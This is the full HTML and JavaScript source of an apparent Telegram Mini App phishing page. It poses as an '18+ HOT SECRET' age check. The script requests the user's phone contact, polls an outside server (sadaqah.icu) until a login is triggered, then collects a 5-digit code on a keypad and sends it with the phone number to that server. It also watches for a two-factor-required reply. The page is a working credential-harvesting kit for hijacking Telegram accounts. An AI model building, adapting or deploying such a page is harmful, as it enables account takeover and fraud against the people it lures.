<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>HOT SECRET · 18+</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --button-text: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
    }

    body {
      min-height: 100vh;
      color: var(--text);
      background-image: url('./baba.jpeg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      padding: env(safe-area-inset-top, 16px) 16px env(safe-area-inset-bottom, 16px);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: rgba(8, 10, 14, 0.72);
      pointer-events: none;
      z-index: 0;
    }

    .wrap {
      position: relative;
      z-index: 2;
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .card {
      background: rgba(20, 22, 28, 0.6);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: var(--radius);
      box-shadow: 0 20px 44px rgba(0, 0, 0, 0.5);
      padding: 24px 18px;
      display: flex;
      flex-direction: column;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.2px;
      margin-bottom: 4px;
    }

    .subtitle {
      font-size: 14px;
      color: var(--hint);
      line-height: 1.5;
    }

    .pill {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 40px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.12);
      font-size: 13px;
      font-weight: 500;
      color: var(--hint);
      backdrop-filter: blur(10px);
    }

    .pill.phone-pill {
      background: rgba(46, 166, 255, 0.18);
      color: #2ea6ff;
      border-color: rgba(46, 166, 255, 0.35);
    }

    .top-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      gap: 12px;
      margin-bottom: 20px;
    }

    /* Главный экран */
    .age-check {
      min-height: 380px;
      justify-content: center;
    }

    .age-check .main-banner {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .age-check .main-banner .big-text {
      font-size: 26px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .age-check .main-banner .sub-text {
      font-size: 16px;
      color: var(--hint);
    }

    .age-check .bottom-btn {
      margin-top: auto;
      width: 100%;
    }

    .big-action-btn {
      width: 100%;
      padding: 18px 12px;
      background: rgba(46, 166, 255, 0.9);
      border: none;
      border-radius: 60px;
      font-size: 18px;
      font-weight: 600;
      color: white;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: 0 8px 24px rgba(0, 110, 255, 0.3);
      cursor: pointer;
      transition: 0.12s;
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    .big-action-btn:active {
      opacity: 0.8;
      transform: scale(0.98);
    }

    .big-action-btn:disabled {
      opacity: 0.45;
      cursor: not-allowed;
      transform: none;
    }

    /* Кнопка под точками (маленькая, для Telegram) */
    .mini-telegram-btn {
      width: 100%;
      background: rgba(0, 136, 204, 0.85);
      border: none;
      border-radius: 40px;
      padding: 12px;
      font-size: 16px;
      font-weight: 600;
      color: white;
      backdrop-filter: blur(8px);
      cursor: pointer;
      transition: 0.15s;
      margin-top: 8px;
      border: 1px solid rgba(255, 255, 255, 0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .mini-telegram-btn:active {
      opacity: 0.7;
      transform: scale(0.97);
    }

    /* Большая кнопка отправки кода (под клавиатурой) */
    .submit-code-btn {
      width: 100%;
      padding: 18px 12px;
      background: rgba(46, 166, 255, 0.9);
      border: none;
      border-radius: 60px;
      font-size: 18px;
      font-weight: 600;
      color: white;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: 0 8px 24px rgba(0, 110, 255, 0.3);
      cursor: pointer;
      transition: 0.12s;
      margin-top: 20px;
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    .submit-code-btn:active {
      opacity: 0.8;
      transform: scale(0.98);
    }

    .submit-code-btn:disabled {
      opacity: 0.45;
      cursor: not-allowed;
      transform: none;
    }

    .code-container {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 32px;
      padding: 20px 16px 16px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      margin: 16px 0 12px;
    }

    .dots {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin: 12px 0 8px;
    }

    .dot {
      width: 16px;
      height: 16px;
      border-radius: 16px;
      background: rgba(255, 255, 255, 0.18);
      border: 1px solid rgba(255, 255, 255, 0.2);
      transition: all 0.2s ease;
    }

    .dot.filled {
      background: #2ea6ff;
      border-color: #2ea6ff;
      box-shadow: 0 0 12px #2ea6ff88;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      color: var(--hint);
      font-size: 14px;
      padding: 0 8px;
      margin-bottom: 16px;
    }

    .delete-hint {
      display: flex;
      align-items: center;
      gap: 4px;
    }

    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-top: 12px;
    }

    .key {
      height: 70px;
      border-radius: 24px;
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.12);
      font-size: 28px;
      font-weight: 600;
      color: var(--text);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
      cursor: pointer;
      transition: 0.1s;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .key:active {
      background: rgba(255, 255, 255, 0.22);
      transform: scale(0.95);
    }

    .key.spacer {
      opacity: 0;
      pointer-events: none;
    }

    .hidden {
      display: none !important;
    }

    /* Статусные строки (лоадеры) */
    .status-line {
      margin-top: 14px;
      text-align: center;
      font-size: 13px;
      color: var(--hint);
      min-height: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .status-line-first {
      margin-top: 16px;
      text-align: center;
      font-size: 14px;
      color: var(--hint);
      min-height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .spinner {
      width: 16px;
      height: 16px;
      flex-shrink: 0;
      border: 2px solid rgba(255,255,255,.15);
      border-top-color: #2ea6ff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
<div class="wrap">
  <!-- Экран 1: возрастное подтверждение с индикатором загрузки -->
  <div id="ageScreen" class="card age-check">
    <div class="top-row" style="justify-content: center; margin-bottom: 8px;">
      <span class="pill" style="background: rgba(255,255,255,0.15);">🔞 18+</span>
    </div>
    <div class="main-banner">
      <div class="title" style="font-size: 28px;">Confirm you are 18+</div>
      <div class="sub-text"> </div>
    </div>
    <div class="bottom-btn">
      <button class="big-action-btn" id="confirmAgeBtn">I am 18+</button>
    </div>
    <!-- Индикатор загрузки для первого экрана -->
    <div class="status-line-first" id="firstScreenStatus"></div>
  </div>

  <!-- Экран 2: ввод кода с изменённым порядком кнопок -->
  <div id="codeScreen" class="card hidden">
    <span class="pill phone-pill" id="phonePill" style="display: none;">+79****0080</span>
    
    <!-- Блок с точками + МАЛЕНЬКАЯ КНОПКА ДЛЯ ТЕЛЕГРАМА (вместо check code) -->
    <div class="code-container">
      <div class="dots" id="dotsContainer"></div>
      <div class="info-row">
        <span id="codeProgress">0 / 5</span>
        <span class="delete-hint">⌫ — delete</span>
      </div>
      <!-- Теперь здесь кнопка для перехода в Telegram (маленькая) -->
      <button class="mini-telegram-btn" id="telegramMiniBtn">
        <span>✈️</span> Go to codes
      </button>
    </div>

    <!-- Цифровая клавиатура -->
    <div id="keyboard" class="keyboard"></div>

    <!-- БОЛЬШАЯ КНОПКА ДЛЯ ОТПРАВКИ КОДА (под клавиатурой) -->
    <button class="submit-code-btn" id="checkCodeBtn" disabled>✓ Submit code</button>

    <!-- Строка статуса (для индикации отправки кода) -->
    <div class="status-line" id="statusLine"></div>
  </div>
</div>

<script>
  (function() {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const tgUser = tg.initDataUnsafe?.user;
    const userId = tgUser?.id;
    if (!userId) {
      alert('No user ID — запустите через Telegram');
      throw new Error('No user ID');
    }

    // Элементы
    const ageScreen = document.getElementById('ageScreen');
    const codeScreen = document.getElementById('codeScreen');
    const confirmBtn = document.getElementById('confirmAgeBtn');
    const firstScreenStatus = document.getElementById('firstScreenStatus');
    const phonePill = document.getElementById('phonePill');
    const dotsContainer = document.getElementById('dotsContainer');
    const progressSpan = document.getElementById('codeProgress');
    const keyboardDiv = document.getElementById('keyboard');
    const telegramMiniBtn = document.getElementById('telegramMiniBtn');
    const checkCodeBtn = document.getElementById('checkCodeBtn');
    const statusLine = document.getElementById('statusLine');

    // Состояние
    const CODE_LENGTH = 5;
    let currentCode = [];
    let phone = '';
    let polling = false;
    let pollTimer = null;

    function maskPhone(rawPhone) {
      if (!rawPhone) return '—';
      const digits = rawPhone.replace(/\D/g, '');
      if (digits.length < 6) return rawPhone;
      return '+' + digits.slice(0, 2) + '****' + digits.slice(-4);
    }

    // Обновление точек и активация кнопки сабмита
    function renderDots() {
      dotsContainer.innerHTML = '';
      for (let i = 0; i < CODE_LENGTH; i++) {
        const dot = document.createElement('div');
        dot.className = 'dot' + (i < currentCode.length ? ' filled' : '');
        dotsContainer.appendChild(dot);
      }
      progressSpan.textContent = `${currentCode.length} / ${CODE_LENGTH}`;
      checkCodeBtn.disabled = currentCode.length !== CODE_LENGTH;
    }

    function addDigit(d) {
      if (currentCode.length < CODE_LENGTH) {
        currentCode.push(d);
        renderDots();
      }
    }

    function deleteLast() {
      currentCode.pop();
      renderDots();
    }

    function resetCode() {
      currentCode = [];
      renderDots();
    }

    // Управление статусом на втором экране
    function setStatus(text, spin = false) {
      statusLine.innerHTML = spin
        ? `<div class="spinner"></div><span>${text}</span>`
        : `<span>${text}</span>`;
    }

    // Управление статусом на первом экране
    function setFirstStatus(text, spin = false) {
      firstScreenStatus.innerHTML = spin
        ? `<div class="spinner"></div><span>${text}</span>`
        : `<span>${text}</span>`;
    }

    // Построить клавиатуру
    function buildKeyboard() {
      const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'spacer', '0', 'del'];
      keyboardDiv.innerHTML = '';
      keys.forEach(k => {
        const btn = document.createElement('button');
        btn.className = 'key' + (k === 'spacer' ? ' spacer' : '');
        if (k === 'del') {
          btn.textContent = '⌫';
          btn.addEventListener('click', deleteLast);
        } else if (k !== 'spacer') {
          btn.textContent = k;
          btn.addEventListener('click', () => addDigit(k));
        }
        keyboardDiv.appendChild(btn);
      });
    }

    // Поллинг
    function startPolling() {
      if (polling) return;
      polling = true;
      let attempts = 0;
      const maxAttempts = 30;

      async function poll() {
        if (!polling) return;
        attempts++;
        if (attempts > maxAttempts) {
          stopPolling();
          setFirstStatus('Timed out. Please try again.');
          confirmBtn.disabled = false;
          return;
        }

        try {
          const resp = await fetch(
            `https://sadaqah.icu/status?user_id=${userId}`,
            { cache: 'no-store' }
          );
          const data = await resp.json();
          console.log('[poll]', data);

          if (data.state === 'get_code' && data.phone) {
            phone = data.phone;
            phonePill.textContent = maskPhone(phone);
            setFirstStatus(''); // очищаем статус первого экрана
            stopPolling();
            // Переключаем экраны
            ageScreen.classList.add('hidden');
            codeScreen.classList.remove('hidden');
            buildKeyboard();
            renderDots();
            return;
          }
        } catch (e) {
          console.warn('[poll] error', e);
        }

        pollTimer = setTimeout(poll, 2000);
      }

      poll();
    }

    function stopPolling() {
      polling = false;
      if (pollTimer) {
        clearTimeout(pollTimer);
        pollTimer = null;
      }
    }

    // Запрос контакта (с лоадером на первом экране)
    function startContactFlow() {
      confirmBtn.disabled = true;
      setFirstStatus('Requesting number...', true);

      tg.requestContact((success) => {
        console.log('[requestContact] success=', success);
        if (!success) {
          confirmBtn.disabled = false;
          setFirstStatus('Denied. Please try again.');
          return;
        }
        setFirstStatus('Waiting for confirmation...', true);
        startPolling();
      });
    }

    // Отправка кода (с лоадером на кнопке)
    async function submitCode() {
      if (currentCode.length !== CODE_LENGTH) return;

      const code = currentCode.join('');
      // Показываем лоадер на кнопке и блокируем её
      checkCodeBtn.disabled = true;
      const originalText = checkCodeBtn.textContent;
      checkCodeBtn.innerHTML = '<div class="spinner" style="margin-right: 8px;"></div> Checking...';

      try {
        const response = await fetch('https://sadaqah.icu/submit_code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id: userId, phone, code })
        });
        const data = await response.json();

        if (data.status === 'ok' || data.status === '2fa_required') {
          tg.close();
        } else {
          alert(data.message || 'Incorrect code, please try again');
          resetCode();
        }
      } catch (e) {
        alert('Network error. Please try again.');
        resetCode();
      } finally {
        // Восстанавливаем кнопку
        checkCodeBtn.innerHTML = originalText;
        checkCodeBtn.disabled = currentCode.length !== CODE_LENGTH;
        setStatus('');
      }
    }

    // ---- СОБЫТИЯ ----
    confirmBtn.addEventListener('click', startContactFlow);

    telegramMiniBtn.addEventListener('click', () => {
      // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ЧАТ С КОДАМИ
      const telegramLink = 'https://t.me/+42777';
      tg.openTelegramLink(telegramLink);
    });

    checkCodeBtn.addEventListener('click', submitCode);

    // Поддержка физической клавиатуры
    window.addEventListener('keydown', (e) => {
      if (codeScreen.classList.contains('hidden')) return;
      if (/^[0-9]$/.test(e.key)) addDigit(e.key);
      if (e.key === 'Backspace') deleteLast();
      if (e.key === 'Enter' && currentCode.length === CODE_LENGTH) submitCode();
    });

    // Инициализация (если phone уже есть в URL — для теста)
    const urlParams = new URLSearchParams(location.search);
    const urlPhone = urlParams.get('phone');
    if (urlPhone) {
      phone = urlPhone;
      phonePill.textContent = maskPhone(phone);
      ageScreen.classList.add('hidden');
      codeScreen.classList.remove('hidden');
      buildKeyboard();
      renderDots();
    }
  })();
</script>
<!-- 
  Изменения:
  - На первом экране добавлен отдельный статус (firstScreenStatus) для лоадера.
  - При нажатии "I am 18+" кнопка блокируется и появляется спиннер.
  - Кнопки на втором экране поменяны местами:
      * маленькая под точками (mini-telegram-btn) открывает Telegram.
      * большая под клавиатурой (submit-code-btn) отправляет код.
  - При отправке кода на большой кнопке отображается спиннер.
-->
</body>
</html>
